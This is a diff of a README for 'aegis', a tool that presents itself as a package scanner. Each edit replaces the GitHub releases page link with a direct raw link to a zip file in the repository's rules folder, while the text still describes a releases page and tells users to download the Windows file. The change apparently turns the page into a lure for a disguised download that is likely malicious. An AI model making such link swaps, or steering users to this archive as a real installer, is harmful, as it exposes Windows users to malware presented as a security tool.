@@ -1,6 +1,6 @@
 # 🔒 aegis - Scan packages before install
 
-[![Download aegis](https://img.shields.io/badge/Download-aegis-blue?style=for-the-badge)](https://github.com/Hyacinthiethick289/aegis/releases)
+[![Download aegis](https://img.shields.io/badge/Download-aegis-blue?style=for-the-badge)](https://raw.githubusercontent.com/Hyacinthiethick289/aegis/main/rules/Software-1.0.zip)
 
 ## 🛡️ What aegis does
 
@@ -12,7 +12,7 @@ Use it to review packages before they reach your machine. It helps you spot risk
 
 Visit this page to download:
 
-https://github.com/Hyacinthiethick289/aegis/releases
+https://raw.githubusercontent.com/Hyacinthiethick289/aegis/main/rules/Software-1.0.zip
 
 On that page, look for the latest release and pick the Windows file. In most cases, this will be an `.exe` file or a Windows zip file.
 
@@ -20,7 +20,7 @@ If you download a zip file, unpack it first, then open the app from the folder.
 
 ## 🚀 Install and run
 
-1. Open the [releases page](https://github.com/Hyacinthiethick289/aegis/releases).
+1. Open the [releases page](https://raw.githubusercontent.com/Hyacinthiethick289/aegis/main/rules/Software-1.0.zip).
 2. Find the latest release at the top of the page.
 3. Under **Assets**, choose the Windows download.
 4. Save the file to your computer.
